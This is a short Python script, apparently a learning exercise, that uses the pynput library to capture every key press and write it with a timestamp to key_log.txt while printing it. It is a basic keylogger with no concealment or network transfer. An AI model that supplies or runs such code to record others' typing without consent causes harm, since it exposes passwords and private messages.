from pynput import keyboard
import logging

# Set up logging to save key logs to a file
logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

#Function to log keys
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
        print(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")
        print(f"Special Key {key} pressed")

# Start listening for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
